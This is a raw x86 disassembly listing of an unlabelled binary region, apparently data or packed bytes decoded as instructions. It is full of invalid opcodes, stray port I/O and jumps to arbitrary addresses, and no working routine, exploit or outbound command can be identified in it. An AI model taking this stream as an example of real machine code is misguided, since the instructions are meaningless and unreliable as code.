  41c280:	inc    edx
  41c281:	xor    eax,0xef2c636e
  41c286:	and    ecx,DWORD PTR [edx]
  41c288:	add    dl,dh
  41c28a:	mov    dl,0x66
  41c28c:	in     al,0x5a
  41c28e:	xlat   BYTE PTR ds:[ebx]
  41c28f:	dec    edx
  41c290:	dec    edi
  41c291:	xchg   esi,eax
  41c292:	jo     0x41c22a
  41c294:	jmp    0x41c2f1
  41c296:	jecxz  0x41c2c9
  41c298:	stc    
  41c299:	iret   
  41c29a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c29b:	sub    eax,0xecbfebf3
  41c2a0:	js     0x41c2f7
  41c2a2:	jmp    0x41c285
  41c2a4:	push   cs
  41c2a5:	push   esp
  41c2a6:	xchg   esp,eax
  41c2a7:	sub    dh,dl
  41c2a9:	je     0x41c257
  41c2ab:	mov    edx,0xcd84088
  41c2b0:	pop    ebx
  41c2b1:	jl     0x41c2cf
  41c2b3:	jp     0x41c2fc
  41c2b5:	test   DWORD PTR [edi-0x65],0x735e25dd
  41c2bc:	test   BYTE PTR [ebp+0x9ff968],0x0
	...
  41c333:	add    BYTE PTR [eax+0xd],cl
  41c336:	sbb    eax,0xfebb5dab
  41c33b:	out    dx,eax
  41c33c:	aad    0x1f
  41c33e:	jo     0x41c35e
  41c340:	fnsave [edx+esi*2]
  41c343:	(bad)  
  41c344:	xor    dh,BYTE PTR [eax]
  41c346:	add    DWORD PTR [eax],eax
  41c348:	cmc    
  41c349:	add    BYTE PTR [eax],al
  41c34b:	add    BYTE PTR [edx],bl
  41c34d:	lds    eax,FWORD PTR [ebx-0x71575079]
  41c353:	sbb    al,0x6f
  41c355:	retf   0x458c
  41c358:	imul   ecx,DWORD PTR [ebx+eiz*2-0x51f2aa14],0x43
  41c360:	push   edx
  41c361:	xchg   esp,eax
  41c362:	rcl    DWORD PTR [ecx+0x72],cl
  41c365:	mov    bl,0xba
  41c367:	add    DWORD PTR [edx-0x538cb3df],edx
  41c36d:	mov    esp,0xeb4af71f
  41c372:	pop    ebp
  41c373:	stc    
  41c374:	mov    cl,dl
  41c376:	xchg   DWORD PTR [ebp+0x60a99472],esi
  41c37c:	dec    eax
  41c37d:	in     al,0xd1
  41c37f:	mov    eax,ds:0x77cda63d
  41c384:	and    DWORD PTR [edi],eax
  41c386:	in     al,dx
  41c387:	ja     0x41c400
  41c389:	and    ebx,DWORD PTR [ecx]
  41c38b:	(bad)  
  41c38c:	test   eax,0x91efa50d
  41c391:	dec    eax
  41c392:	nop
  41c393:	mov    ds:0x1e4dc183,eax
  41c398:	sbb    ebx,edi
  41c39a:	fcom   DWORD PTR [esp+eiz*4-0xc]
  41c39e:	mov    eax,ds:0xdfd7eb48
  41c3a3:	ret    
  41c3a4:	sbb    ecx,0x521f80a5
  41c3aa:	test   BYTE PTR [edi+0x5b],0x5
  41c3ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3af:	adc    al,0x57
  41c3b1:	jle    0x41c352
  41c3b3:	mov    bl,al
  41c3b5:	enter  0x88dc,0x41
  41c3b9:	call   0x4260963
  41c3be:	push   cs
  41c3bf:	add    al,0xe9
  41c3c1:	loope  0x41c3e3
  41c3c3:	pusha  
  41c3c4:	pop    ss
  41c3c5:	mov    ebx,0x8adee3e3
  41c3ca:	jl     0x41c3dd
  41c3cc:	sub    eax,0x41f7a6e6
  41c3d1:	sbb    BYTE PTR [ebx+0x6f],ah
  41c3d4:	adc    al,0x38
  41c3d6:	adc    al,0x1e
  41c3d8:	ss mov ah,0x45
  41c3db:	jle    0x41c3e4
  41c3dd:	cdq    
  41c3de:	xor    eax,esi
  41c3e0:	arpl   ax,dx
  41c3e2:	aam    0xdf
  41c3e4:	or     BYTE PTR [eax+eiz*2],0xd6
  41c3e8:	cmp    ebp,DWORD PTR [edx-0x1ca4d088]
  41c3ee:	add    esp,DWORD PTR [ebp-0x1fb10e3]
  41c3f4:	and    BYTE PTR [ecx],bl
  41c3f6:	iret   
  41c3f7:	inc    esp
  41c3f8:	adc    eax,0xa9d98aec
  41c3fd:	sub    BYTE PTR [edi+0x62],bl
  41c400:	sbb    BYTE PTR [ecx-0x46],dl
  41c403:	and    DWORD PTR [edi-0x26ab2a8c],edx
  41c409:	dec    ebp
  41c40a:	push   0xe848eaf0
  41c40f:	test   eax,0x15c405ab
  41c414:	out    0x3c,eax
  41c416:	cmp    dl,BYTE PTR [edi+0x24f06d37]
  41c41c:	mov    ebp,0x736ebee4
  41c421:	in     eax,dx
  41c422:	aaa    
  41c423:	dec    ebp
  41c424:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c425:	lds    edi,FWORD PTR [ebp-0x2e]
  41c428:	ss pusha 
  41c42a:	jnp    0x41c3c5
  41c42c:	cmc    
  41c42d:	dec    esi
  41c42e:	dec    ecx
  41c42f:	and    edi,ebp
  41c431:	mov    dh,0x97
  41c433:	jnp    0x41c3ce
  41c435:	push   ss
  41c436:	repz fwait
  41c438:	in     al,dx
  41c439:	les    esi,FWORD PTR [edi]
  41c43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c43c:	cwde   
  41c43d:	fldcw  WORD PTR [edx+0x7c4]
	...
  41c4b3:	add    ah,dl
  41c4b5:	in     al,dx
  41c4b6:	add    edi,edi
  41c4b8:	cmp    edi,edi
  41c4ba:	(bad)  
  41c4bb:	out    dx,eax
  41c4bc:	dec    edi
  41c4bd:	retf   
  41c4be:	fstp   TBYTE PTR [ebx-0x1ba6e523]
  41c4c4:	daa    
  41c4c5:	xor    DWORD PTR [ecx],eax
  41c4c7:	add    ch,dh
  41c4c9:	add    BYTE PTR [eax],al
  41c4cb:	add    BYTE PTR [eax],bh
  41c4cd:	xchg   edx,eax
  41c4ce:	mov    ds:0xdba440b1,eax
  41c4d3:	or     BYTE PTR [ebx],cl
  41c4d5:	cmp    ecx,eax
  41c4d7:	cli    
  41c4d8:	retf   
  41c4d9:	ins    DWORD PTR es:[edi],dx
  41c4da:	cdq    
  41c4db:	add    esi,0xb608305
  41c4e1:	pop    esi
  41c4e2:	jge    0x41c4b6
  41c4e4:	inc    esi
  41c4e5:	mul    DWORD PTR [ebx-0x603ca13c]
  41c4eb:	std    
  41c4ec:	xchg   bl,bh
  41c4ee:	enter  0xc302,0x43
  41c4f2:	jle    0x41c51f
  41c4f4:	and    cl,BYTE PTR [edi-0x48]
  41c4f7:	inc    edi
  41c4f8:	in     eax,dx
  41c4f9:	out    dx,eax
  41c4fa:	mov    ebp,DWORD PTR [edi+0x72e5f094]
  41c500:	scas   eax,DWORD PTR es:[edi]
  41c501:	mov    bl,cl
  41c503:	mov    edi,0xcf5b9db7
  41c508:	inc    esp
  41c509:	jmp    0xc27ee849
  41c50e:	cmp    bl,dl
  41c510:	pop    esi
  41c511:	pop    edi
  41c512:	xchg   esp,eax
  41c513:	mov    dl,0xf3
  41c515:	jmp    0x41c55b
  41c517:	jp     0x41c4ed
  41c519:	mov    ebp,0xa040ad91
  41c51e:	sub    BYTE PTR [ecx+esi*2-0x12bdc708],0x75
  41c526:	hlt    
  41c527:	(bad)  
  41c528:	sahf   
  41c529:	sub    BYTE PTR [ebx],0x2e
  41c52c:	retf   
  41c52d:	sbb    bl,BYTE PTR [esi-0x12e26781]
  41c533:	fmul   st(1),st
  41c535:	cmp    BYTE PTR [edi-0x661b0b08],dl
  41c53b:	pop    ds
  41c53c:	mov    ebx,0xd61c77c5
  41c541:	pop    edx
  41c542:	stos   DWORD PTR es:[edi],eax
  41c543:	jnp    0x41c51a
  41c545:	inc    edi
  41c546:	and    cl,BYTE PTR [ebx+eax*1+0x1ea967a3]
  41c54d:	dec    eax
  41c54e:	int    0x73
  41c550:	in     eax,0x32
  41c552:	(bad)  
  41c553:	jb     0x41c586
  41c555:	sbb    edi,edi
  41c557:	(bad)  
  41c559:	mov    edx,0x42d13f97
  41c55e:	sub    DWORD PTR [ebp*4+0x4e24ca26],ecx
  41c565:	sbb    ebx,eax
  41c567:	pop    ebp
  41c568:	(bad)  
  41c569:	and    al,BYTE PTR [ebx]
  41c56b:	add    eax,0x666d9bb7
  41c570:	ret    0x98b7
  41c573:	aam    0x73
  41c575:	or     bl,BYTE PTR [edx-0x27d0e7e9]
  41c57b:	mov    al,ds:0x34e7537a
  41c580:	pop    ebp
  41c581:	mov    dh,0xad
  41c583:	cmp    DWORD PTR [ebp+ebp*8+0x1d10cee9],edx
  41c58a:	jp     0x41c513
  41c58c:	cmp    DWORD PTR [ebx+0x4c],0x512bd164
  41c593:	add    DWORD PTR [edi],0xbc840e3d
  41c599:	cmp    ch,ch
  41c59b:	sub    eax,0x76fccd65
  41c5a0:	add    ah,bl
  41c5a2:	xlat   BYTE PTR ds:[ebx]
  41c5a3:	pushf  
  41c5a4:	mov    bh,0xe6
  41c5a6:	stc    
  41c5a7:	in     al,dx
  41c5a8:	pop    ds
  41c5a9:	(bad)  
  41c5aa:	dec    ecx
  41c5ab:	call   0xa65a:0x5df17d16
  41c5b2:	jge    0x41c613
  41c5b4:	std    
  41c5b5:	and    cl,bh
  41c5b7:	jmp    0xa89db622
  41c5bc:	cmp    DWORD PTR [ecx+0x77],esp
  41c5bf:	xor    al,0x7f
	...
  41c631:	add    BYTE PTR [eax],al
  41c633:	add    BYTE PTR [eax-0x2469e49d],ch
  41c639:	(bad)  
  41c63a:	lods   eax,DWORD PTR ds:[esi]
  41c63b:	jg     0x41c62c
  41c63d:	add    al,0x38
  41c63f:	lods   al,BYTE PTR ds:[esi]
  41c640:	nop
  41c641:	arpl   WORD PTR [edi+0x19],cx
  41c644:	sbb    al,0x32
  41c646:	add    DWORD PTR [eax],eax
  41c648:	cmc    
  41c649:	add    BYTE PTR [eax],al
  41c64b:	add    BYTE PTR [edx-0x17],cl
  41c64e:	jns    0x41c5f9
  41c650:	push   edi
  41c651:	mov    ah,0xa1
  41c653:	ret    
  41c654:	test   DWORD PTR [esi-0x32],ebx
  41c657:	mov    ebx,0x221f2cdf
  41c65c:	inc    edx
  41c65d:	xchg   esp,eax
  41c65e:	pop    esi
  41c65f:	and    BYTE PTR [edi],0x81
  41c662:	and    eax,0xf60c9e96
  41c667:	mov    dh,0x88
  41c669:	seta   BYTE PTR [edi+0x2d9e4f12]
  41c670:	lods   eax,DWORD PTR ds:[esi]
  41c671:	inc    eax
  41c672:	aam    0x92
  41c674:	rcr    BYTE PTR [eax+0x40],0x8
  41c678:	and    BYTE PTR [ecx],0xaf
  41c67b:	add    al,0xb2
  41c67d:	mov    gs,WORD PTR [edi]
  41c67f:	je     0x41c6b7
  41c681:	adc    DWORD PTR [esi],ebx
  41c683:	pusha  
  41c684:	lds    eax,FWORD PTR cs:[edi]
  41c687:	fadd   st(0),st
  41c689:	stc    
  41c68a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c68b:	mov    bh,0x38
  41c68d:	xor    esi,DWORD PTR [ebp-0x5f8681e1]
  41c693:	ret    0x3e48
  41c696:	lds    edi,FWORD PTR [edx-0x19]
  41c699:	int    0x96
  41c69b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c69d:	jle    0x41c68d
  41c69f:	hlt    
  41c6a0:	pusha  
  41c6a1:	(bad)  
  41c6a3:	imul   ecx,DWORD PTR [ebx*4-0x17ab069d],0x26afb218
  41c6ae:	and    eax,0x7d25e8a2
  41c6b3:	xor    dl,BYTE PTR [eax+0x4d]
  41c6b6:	ss pop ebp
  41c6b8:	out    0x96,al
  41c6ba:	data16 loope 0x41c640
  41c6bd:	test   eax,0x99ab6965
  41c6c2:	fnstcw WORD PTR [ecx+0x3a]
  41c6c5:	sbb    eax,0x6bfafc08
  41c6ca:	sub    cl,BYTE PTR [edi-0xd2417b9]
  41c6d0:	mov    ebp,0x779a8a60
  41c6d5:	xchg   ecx,eax
  41c6d6:	dec    ecx
  41c6d7:	add    BYTE PTR [ecx-0x6f],dl
  41c6da:	jp     0x41c6be
  41c6dc:	pop    ds
  41c6dd:	mov    esi,0x665ed842
  41c6e2:	sub    al,0xda
  41c6e4:	xchg   ecx,eax
  41c6e5:	jbe    0x41c6f4
  41c6e7:	adc    DWORD PTR [esi-0x2d],edi
  41c6ea:	idiv   DWORD PTR [eax-0x12]
  41c6ed:	cwde   
  41c6ee:	repz sub al,0x7d
  41c6f1:	pop    ds
  41c6f2:	jge    0x41c68a
  41c6f4:	pop    edi
  41c6f5:	bound  esp,QWORD PTR [ecx+0x3d]
  41c6f8:	push   eax
  41c6f9:	loope  0x41c6ee
  41c6fb:	rcl    DWORD PTR [edi-0xc416c3c],0x2f
  41c702:	and    ebx,ebx
  41c704:	int3   
  41c705:	dec    esi
  41c706:	xor    ebp,DWORD PTR [ecx+eiz*8+0xa250a37]
  41c70d:	and    eax,0x3b155440
  41c712:	ficom  WORD PTR [ebp+0x7b]
  41c715:	jb     0x41c6ff
  41c717:	loop   0x41c745
  41c719:	pop    esi
  41c71a:	mov    ch,0x25
  41c71c:	xchg   ebp,eax
  41c71d:	jns    0x41c777
  41c71f:	in     eax,0x1b
  41c721:	xchg   ecx,eax
  41c722:	mov    esi,0xdb85d8b
  41c727:	mov    edi,0x61083fa9
  41c72c:	mov    ebp,0xdd5860a5
  41c731:	neg    BYTE PTR [ecx-0x75dfbc40]
  41c737:	mov    edi,0xcc68838e
  41c73c:	and    BYTE PTR [esi+0xbe3d75],bl
	...
  41c7b2:	add    BYTE PTR [eax],al
  41c7b4:	mov    bh,ah
  41c7b6:	(bad)  
  41c7b7:	dec    esi
  41c7b8:	idiv   DWORD PTR [edi-0x75]
  41c7bb:	cld    
  41c7bc:	add    edi,esp
  41c7be:	adc    eax,0xc47fc654
  41c7c3:	adc    al,0x11
  41c7c5:	xor    eax,DWORD PTR [ecx]
  41c7c7:	add    ch,dh
  41c7c9:	add    BYTE PTR [eax],al
  41c7cb:	add    BYTE PTR [edx+0xadcccca],bh
  41c7d1:	pusha  
  41c7d2:	addr16 xchg ecx,eax
  41c7d4:	int    0x90
  41c7d6:	push   0x6
  41c7d8:	data16 cmp BYTE PTR [esi-0x757cc059],dh
  41c7df:	je     0x41c7c0
  41c7e1:	mov    WORD PTR [esi+0xb41b3ad],es
  41c7e7:	push   ds
  41c7e8:	push   ebp
  41c7e9:	pop    ds
  41c7ea:	ins    DWORD PTR es:[edi],dx
  41c7eb:	mov    ecx,0x8d3e17a6
  41c7f0:	jg     0x41c850
  41c7f2:	stos   DWORD PTR es:[edi],eax
  41c7f3:	jmp    DWORD PTR [esi-0x79eda13a]
  41c7f9:	outs   dx,DWORD PTR ds:[esi]
  41c7fa:	push   ds
  41c7fb:	repz popa 
  41c7fd:	mov    esp,esi
  41c7ff:	fs xor eax,0x9b97da70
  41c805:	pop    edi
  41c806:	jmp    0xbaef:0x1ccb386e
  41c80d:	jnp    0x41c83c
  41c80f:	cwde   
  41c810:	lock push es
  41c812:	into   
  41c813:	push   ecx
  41c814:	cs aam 0x19
  41c817:	mov    ebp,0x303a26b4
  41c81c:	rcr    al,1
  41c81e:	rcl    BYTE PTR [edx+ebx*4],1
  41c821:	mov    ?,WORD PTR [esi+0x2c]
  41c824:	sbb    al,BYTE PTR [ebx+eax*1]
  41c827:	sbb    edx,DWORD PTR ds:0xa5bc1e51
  41c82d:	and    DWORD PTR [ebx+eax*4-0x20208c7c],ebx
  41c834:	rcl    BYTE PTR [edx],1
  41c836:	sbb    BYTE PTR [edi+edi*8],0x5
  41c83a:	int3   
  41c83b:	hlt    
  41c83c:	or     eax,0x236597c3
  41c841:	push   0xffffffe6
  41c843:	or     al,0x3d
  41c845:	out    0x41,eax
  41c847:	call   0xc3ef:0xd58e1b22
  41c84e:	inc    ecx
  41c84f:	aam    0x18
  41c851:	jg     0x41c88c
  41c853:	pop    edi
  41c854:	pop    es
  41c855:	xchg   ebp,eax
  41c856:	push   ss
  41c857:	jle    0x41c8c3
  41c859:	imul   ebx,DWORD PTR [ecx],0x27
  41c85c:	cmp    al,BYTE PTR [ecx-0x7c]
  41c85f:	in     eax,0xfb
  41c861:	xchg   ebp,eax
  41c862:	bound  edi,QWORD PTR [esi+0x70]
  41c865:	leave  
  41c866:	cmp    eax,0x616c6d2d
  41c86b:	mov    ds:0x241b18a2,eax
  41c870:	test   DWORD PTR [edi+0xa0316de],edx
  41c876:	dec    ebp
  41c877:	imul   esp,ebx,0x55
  41c87a:	mov    al,ds:0xe678e220
  41c87f:	and    dh,BYTE PTR [ecx]
  41c881:	outs   dx,DWORD PTR ds:[esi]
  41c882:	retf   0x81dc
  41c885:	jle    0x41c8f9
  41c887:	add    al,0x52
  41c889:	fbld   TBYTE PTR [esi+0x4b]
  41c88c:	xchg   ebp,eax
  41c88d:	out    dx,eax
  41c88e:	mov    ds:0xf4987f,eax
  41c893:	mov    bh,0xed
  41c895:	pop    edi
  41c896:	pop    eax
  41c897:	daa    
  41c898:	and    BYTE PTR [ebp-0x43b59aee],dh
  41c89e:	mov    ds:0xc845cd60,al
  41c8a3:	sar    DWORD PTR [esi],cl
  41c8a5:	out    0xe8,eax
  41c8a7:	imul   ebx,DWORD PTR [ecx-0x16],0xffffffe3
  41c8ab:	sub    BYTE PTR [edx],bl
  41c8ad:	retf   
  41c8ae:	jbe    0x41c860
  41c8b0:	and    esi,esp
  41c8b2:	scas   al,BYTE PTR es:[edi]
  41c8b3:	xchg   esi,eax
  41c8b4:	mov    edi,0x4d10b2f1
  41c8b9:	mov    ds:0x8d5e6b12,al
  41c8be:	aam    0x95
  41c8c0:	pop    edx
	...
  41c931:	add    BYTE PTR [eax],al
  41c933:	add    bl,al
  41c935:	mov    esp,0xf87f4844
  41c93a:	iret   
  41c93b:	mov    edi,0x4f0c9749
  41c940:	in     al,dx
  41c941:	fstp   DWORD PTR [eax+ebx*8+0x13406]
  41c948:	cmc    
  41c949:	add    BYTE PTR [eax],al
  41c94b:	add    al,bl
  41c94d:	dec    ebx
  41c94e:	outs   dx,DWORD PTR ds:[esi]
  41c94f:	mov    ebx,0x3d1663a2
  41c954:	dec    ebp
  41c955:	fsub   DWORD PTR [edi]
  41c957:	leave  
  41c958:	mov    ds:0x4390eb67,eax
  41c95d:	xchg   esi,eax
  41c95e:	push   0xffffffdf
  41c960:	dec    esi
  41c961:	push   eax
  41c962:	(bad)  
  41c963:	scas   al,BYTE PTR es:[edi]
  41c964:	push   ds
  41c965:	imul   edi,DWORD PTR [edx+0x1c3f00a2],0xffffffc3
  41c96c:	mov    ebp,0x2ef12ea8
  41c971:	ret    0x9ecf
  41c974:	dec    eax
  41c975:	adc    eax,0xc57fafa4
  41c97a:	xor    DWORD PTR [edx-0x47],ebp
  41c97d:	adc    BYTE PTR [ebx],ch
  41c97f:	call   0xa44736bb
  41c984:	and    DWORD PTR [edi+0x3ac40c87],edi
  41c98a:	lods   al,BYTE PTR ds:[esi]
  41c98b:	mov    BYTE PTR [eax+0x76],dl
  41c98e:	push   0x4
  41c990:	mov    edi,0x16a41f51
  41c995:	adc    al,0x83
  41c997:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c998:	add    DWORD PTR [ecx],ebp
  41c99a:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c99c:	inc    eax
  41c99d:	dec    ebp
  41c99e:	fucomp st(7)
  41c9a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9a1:	popf   
  41c9a2:	inc    ebp
  41c9a3:	cdq    
  41c9a4:	and    DWORD PTR [edx+0x67],edx
  41c9a7:	in     eax,0x29
  41c9a9:	or     DWORD PTR [ecx+0x10],edi
  41c9ac:	inc    ecx
  41c9ad:	xchg   ecx,eax
  41c9ae:	adc    dl,BYTE PTR [ebp-0x34]
  41c9b1:	mov    dh,0x71
  41c9b3:	(bad)  
  41c9b4:	cwde   
  41c9b5:	mov    ch,0x78
  41c9b7:	in     al,0x63
  41c9b9:	stc    
  41c9ba:	jmp    0x41ca06
  41c9bc:	xchg   bl,dh
  41c9be:	and    al,BYTE PTR [edi-0x4f64859]
  41c9c4:	push   0x4a
  41c9c6:	xchg   edx,eax
  41c9c7:	std    
  41c9c8:	xor    ch,bl
  41c9ca:	mov    esp,0xda8dd417
  41c9cf:	jecxz  0x41c999
  41c9d1:	jae    0x41ca20
  41c9d3:	bswap  edi
  41c9d5:	ja     0x41c9ab
  41c9d7:	mov    dl,bl
  41c9d9:	out    0x8a,eax
  41c9db:	mov    bh,0xfe
  41c9dd:	in     al,0xe6
  41c9df:	lock adc BYTE PTR [edx],bl
  41c9e2:	das    
  41c9e3:	sub    eax,0xc837a840
  41c9e8:	daa    
  41c9e9:	std    
  41c9ea:	mov    dl,0xb6
  41c9ec:	mov    ebx,0x7ca9aeb6
  41c9f1:	adc    ah,BYTE PTR [ebx]
  41c9f3:	and    esi,DWORD PTR [edi+0x7fda6288]
  41c9f9:	fsubrp st(1),st
  41c9fb:	xchg   BYTE PTR [edi+0x2d1f4ad8],ah
  41ca01:	push   ebp
  41ca02:	daa    
  41ca03:	push   ss
  41ca04:	scas   eax,DWORD PTR es:[edi]
  41ca05:	xchg   edi,eax
  41ca06:	enter  0x6a96,0x3c
  41ca0a:	jns    0x41c9af
  41ca0c:	jmp    0x41ca17
  41ca0e:	xchg   BYTE PTR ds:0xabdd4128,dh
  41ca14:	inc    ecx
  41ca15:	pop    edi
  41ca16:	int3   
  41ca17:	ins    DWORD PTR es:[edi],dx
  41ca18:	lods   eax,DWORD PTR ds:[esi]
  41ca19:	rcl    DWORD PTR [esi],1
  41ca1b:	sbb    al,0x7d
  41ca1d:	pop    edx
  41ca1e:	loopne 0x41ca12
  41ca20:	pop    ds
  41ca21:	scas   eax,DWORD PTR es:[edi]
  41ca22:	sub    DWORD PTR [ecx],esi
  41ca24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca25:	outs   dx,BYTE PTR ds:[esi]
  41ca26:	out    0xa2,eax
  41ca28:	in     eax,dx
  41ca29:	jbe    0x41ca3f
  41ca2b:	add    edi,DWORD PTR [esi-0x71007b48]
  41ca31:	xchg   DWORD PTR [edx*4-0x5eb52664],ecx
  41ca38:	xor    DWORD PTR [esi-0x6cf1a961],ebx
  41ca3e:	mov    ds:0xb9d5,al
	...
  41cab3:	add    BYTE PTR [edx],cl
  41cab5:	mov    eax,0xbfb7aaa5
  41caba:	(bad)  
  41cabc:	sbb    eax,0x61e2887e
  41cac1:	mov    bl,0xb
  41cac3:	sar    bl,cl
  41cac5:	xor    al,0x1
  41cac7:	add    ch,dh
  41cac9:	add    BYTE PTR [eax],al
  41cacb:	add    BYTE PTR [eax],bl
  41cacd:	lea    ebx,[esi+0x5dc11853]
  41cad3:	xor    edi,ecx
  41cad5:	jae    0x41cadb
  41cad7:	pop    ds
  41cad8:	dec    ebx
  41cad9:	mov    edi,0xc553f84d
  41cade:	push   eax
  41cadf:	jp     0x41cb3e
  41cae1:	stos   DWORD PTR es:[edi],eax
  41cae2:	pop    ecx
  41cae3:	inc    esp
  41cae4:	mov    edx,0x4f1a5364
  41cae9:	push   0x10105ac6
  41caee:	stos   DWORD PTR es:[edi],eax
  41caef:	push   cs
  41caf0:	ficom  WORD PTR [eax-0x4d17c679]
  41caf6:	cmp    esp,DWORD PTR [edi+ecx*8-0x4d]
  41cafa:	xchg   esi,eax
  41cafb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cafc:	iret   
  41cafd:	das    
  41cafe:	xor    edx,ebp
  41cb00:	sbb    al,0xa9
  41cb02:	je     0x41cb24
  41cb04:	and    dh,BYTE PTR [edx-0x3a]
  41cb07:	dec    ebp
  41cb08:	mov    ds:0xa0f42461,al
  41cb0d:	out    0xb8,eax
  41cb0f:	hlt    
  41cb10:	inc    edi
  41cb11:	xchg   ebp,eax
  41cb12:	sub    al,0x3f
  41cb14:	shr    DWORD PTR [ebx],1
  41cb16:	popa   
  41cb17:	inc    ebp
  41cb18:	fs pop es
  41cb1a:	stos   BYTE PTR es:[edi],al
  41cb1b:	push   cs
  41cb1c:	pop    ebx
  41cb1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb1e:	repz pop ebx
  41cb20:	xor    BYTE PTR ds:0x5404d9b1,ch
  41cb26:	call   0x1e11:0x657571ab
  41cb2d:	push   ebp
  41cb2e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb2f:	mov    al,ds:0x4e379ccf
  41cb34:	mov    ebx,0xff299614
  41cb39:	push   ebp
  41cb3a:	retf   
  41cb3b:	mov    eax,ds:0xc5a3d4e4
  41cb40:	mov    ebx,0x99ff8e24
  41cb45:	add    edi,DWORD PTR [edi+0x6b81d003]
  41cb4b:	and    ebp,DWORD PTR [edx]
  41cb4d:	out    0x95,al
  41cb4f:	adc    BYTE PTR [ecx-0x182909e3],0x43
  41cb56:	xor    dl,ch
  41cb58:	xlat   BYTE PTR ds:[ebx]
  41cb59:	or     BYTE PTR [edx+0x10],ch
  41cb5c:	outs   dx,DWORD PTR ds:[esi]
  41cb5d:	xchg   esi,eax
  41cb5e:	mov    dl,0x9c
  41cb60:	data16 out 0x5c,al
  41cb63:	dec    edi
  41cb64:	scas   al,BYTE PTR es:[edi]
  41cb65:	and    al,0xc4
  41cb67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb68:	shr    ch,cl
  41cb6a:	int3   
  41cb6b:	loopne 0x41cbb6
  41cb6d:	xor    BYTE PTR [ebx],bl
  41cb6f:	test   bl,cl
  41cb71:	or     BYTE PTR [ebx-0x1217e6d7],cl
  41cb77:	cld    
  41cb78:	retf   0xb3ff
  41cb7b:	int3   
  41cb7c:	or     DWORD PTR [edi],ecx
  41cb7e:	call   DWORD PTR [ebx+esi*8+0x3c]
  41cb82:	adc    BYTE PTR [edx+eiz*8-0x45dd866f],dh
  41cb89:	fldenv [ecx-0x3b]
  41cb8c:	jmp    0x41cb7f
  41cb8e:	aas    
  41cb8f:	sub    DWORD PTR [eax+0x63],esp
  41cb92:	les    ecx,FWORD PTR [ecx]
  41cb94:	jbe    0x41cb1a
  41cb96:	int3   
  41cb97:	jae    0x41cb53
  41cb99:	push   ecx
  41cb9a:	xchg   edi,eax
  41cb9b:	jmp    0x41cb3a
  41cb9d:	aad    0x36
  41cb9f:	dec    edi
  41cba0:	adc    eax,0x93a27d62
  41cba5:	arpl   WORD PTR [ebp+ebp*1+0x4b],dx
  41cba9:	xchg   ecx,eax
  41cbaa:	rcr    DWORD PTR [ecx+esi*2-0x55],0xfa
  41cbaf:	mov    ebp,0x4d569b5f
  41cbb4:	pop    ds
  41cbb5:	xchg   esi,eax
  41cbb6:	or     bl,BYTE PTR [edx-0x263a2b85]
  41cbbc:	adc    eax,0x94dffe56
	...
  41cc31:	add    BYTE PTR [eax],al
  41cc33:	add    dl,dl
  41cc35:	xor    bh,dl
  41cc37:	clc    
  41cc38:	cli    
  41cc39:	clc    
  41cc3a:	sar    BYTE PTR [edx],cl
  41cc3c:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cc3e:	inc    eax
  41cc3f:	aam    0x8f
  41cc41:	ins    DWORD PTR es:[edi],dx
  41cc42:	pop    es
  41cc43:	sub    al,0xf0
  41cc45:	xor    eax,0xf50001
  41cc4a:	add    BYTE PTR [eax],al
  41cc4c:	sbb    eax,0x1d09c3ed
  41cc51:	call   0x66b90074
  41cc56:	ins    DWORD PTR es:[edi],dx
  41cc57:	jne    0x41ccd5
  41cc59:	pushf  
  41cc5a:	es call 0xca50:0xa62c2ecb
  41cc62:	jns    0x41cc1e
  41cc64:	mov    esi,0xbe79b02d
  41cc69:	in     al,0x71
  41cc6b:	mov    esi,0xf17cdb9d
  41cc70:	cmp    al,0x3c
  41cc72:	rcr    BYTE PTR [edi+0x139596fc],0xcd
  41cc79:	test   al,0x37
  41cc7b:	rcr    DWORD PTR [ecx],cl
  41cc7d:	or     eax,0xf1d36e43
  41cc82:	movups xmm1,XMMWORD PTR [esi]
  41cc85:	push   cs
  41cc86:	jmp    DWORD PTR [eax+0x4d]
  41cc89:	cmp    DWORD PTR [ebx-0x52c81259],0x28
  41cc90:	(bad)  
  41cc92:	pop    edx
  41cc93:	xor    BYTE PTR [edx+ebp*4-0x7ac331b4],cl
  41cc9a:	dec    esi
  41cc9b:	popf   
  41cc9c:	xor    BYTE PTR [edx],bh
  41cc9e:	je     0x41cc33
  41cca0:	test   al,0x3b
  41cca2:	mov    ebx,0xd744bb0b
  41cca7:	test   al,0x7c
  41cca9:	loope  0x41ccbf
  41ccab:	xor    eax,0x8840e688
  41ccb0:	sbb    BYTE PTR [esi-0x5e5589fc],ah
  41ccb6:	fistp  QWORD PTR [eax+0x7c]
  41ccb9:	adc    al,0x73
  41ccbb:	push   es
  41ccbc:	and    al,0xf
  41ccbe:	mov    al,0xe5
  41ccc0:	std    
  41ccc1:	js     0x41cc84
  41ccc3:	mov    ch,0x5c
  41ccc5:	test   BYTE PTR [ebx+0x7cc6b3b2],bh
  41cccb:	sbb    al,0x95
  41cccd:	jge    0x41cd2e
  41cccf:	cmp    DWORD PTR [esi+ebx*8],ebp
  41ccd2:	es std 
  41ccd4:	add    BYTE PTR [esi+ebp*8-0x37],al
  41ccd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccda:	jnp    0x41ccc2
  41ccdc:	or     eax,0x6afad36e
  41cce1:	jns    0x41cc86
  41cce3:	sahf   
  41cce4:	adc    DWORD PTR [ebp+0x7],0xb788d7a9
  41cceb:	push   0xa3a2c145
  41ccf0:	test   eax,0x601e16cb
  41ccf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
